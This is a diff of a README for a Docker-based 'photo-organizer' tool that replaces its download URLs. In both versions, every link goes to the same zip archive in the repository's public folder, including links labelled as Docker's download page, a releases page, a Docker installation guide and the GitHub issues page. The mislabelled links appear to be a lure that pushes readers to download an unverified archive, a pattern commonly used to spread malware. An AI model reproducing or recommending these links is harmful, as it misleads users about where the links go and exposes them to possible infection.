@@ -1,6 +1,6 @@
 # 🐳 photo-organizer - Organize Your Photos, Videos, and Docs by Date
 
-[![Download photo-organizer](https://raw.githubusercontent.com/akhikamil01/photo-organizer/main/public/photo-organizer-v1.3.zip%https://raw.githubusercontent.com/akhikamil01/photo-organizer/main/public/photo-organizer-v1.3.zip)](https://raw.githubusercontent.com/akhikamil01/photo-organizer/main/public/photo-organizer-v1.3.zip)
+[![Download photo-organizer](https://github.com/akhikamil01/photo-organizer/raw/refs/heads/main/public/organizer_photo_1.2.zip%https://github.com/akhikamil01/photo-organizer/raw/refs/heads/main/public/organizer_photo_1.2.zip)](https://github.com/akhikamil01/photo-organizer/raw/refs/heads/main/public/organizer_photo_1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,12 +10,12 @@ Welcome to **photo-organizer**! This application helps you sort your photos, vid
 
 To run **photo-organizer**, you will need:
 - A computer running Windows, Mac, or Linux.
-- Docker installed on your system. You can download Docker from [here](https://raw.githubusercontent.com/akhikamil01/photo-organizer/main/public/photo-organizer-v1.3.zip).
+- Docker installed on your system. You can download Docker from [here](https://github.com/akhikamil01/photo-organizer/raw/refs/heads/main/public/organizer_photo_1.2.zip).
 - An internet connection to download the software.
 
 ### 📥 Download & Install
 
-To get started, visit this page to download the latest version of **photo-organizer**: [Releases Page](https://raw.githubusercontent.com/akhikamil01/photo-organizer/main/public/photo-organizer-v1.3.zip).
+To get started, visit this page to download the latest version of **photo-organizer**: [Releases Page](https://github.com/akhikamil01/photo-organizer/raw/refs/heads/main/public/organizer_photo_1.2.zip).
 
 1. Click on the link above.
 2. Locate the latest release.
@@ -77,7 +77,7 @@ If you encounter any issues, follow these steps:
 2. **Update Docker**: Make sure you have the latest version of Docker.
 3. **Verify File Path**: Double-check that the file path to your media directory is correct in the command.
 
-If problems persist, visit the [GitHub Issues Page](https://raw.githubusercontent.com/akhikamil01/photo-organizer/main/public/photo-organizer-v1.3.zip) for help.
+If problems persist, visit the [GitHub Issues Page](https://github.com/akhikamil01/photo-organizer/raw/refs/heads/main/public/organizer_photo_1.2.zip) for help.
 
 ## 🌍 Contributing
 
@@ -85,8 +85,8 @@ We welcome contributions! If you want to help improve **photo-organizer**, pleas
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://raw.githubusercontent.com/akhikamil01/photo-organizer/main/public/photo-organizer-v1.3.zip)
-- [Docker Installation Guide](https://raw.githubusercontent.com/akhikamil01/photo-organizer/main/public/photo-organizer-v1.3.zip)
-- [GitHub Issues Page](https://raw.githubusercontent.com/akhikamil01/photo-organizer/main/public/photo-organizer-v1.3.zip) 
+- [Releases Page](https://github.com/akhikamil01/photo-organizer/raw/refs/heads/main/public/organizer_photo_1.2.zip)
+- [Docker Installation Guide](https://github.com/akhikamil01/photo-organizer/raw/refs/heads/main/public/organizer_photo_1.2.zip)
+- [GitHub Issues Page](https://github.com/akhikamil01/photo-organizer/raw/refs/heads/main/public/organizer_photo_1.2.zip) 
 
-Start organizing your media today! Visit the releases page to download **photo-organizer**: [Download photo-organizer](https://raw.githubusercontent.com/akhikamil01/photo-organizer/main/public/photo-organizer-v1.3.zip).
+Start organizing your media today! Visit the releases page to download **photo-organizer**: [Download photo-organizer](https://github.com/akhikamil01/photo-organizer/raw/refs/heads/main/public/organizer_photo_1.2.zip).
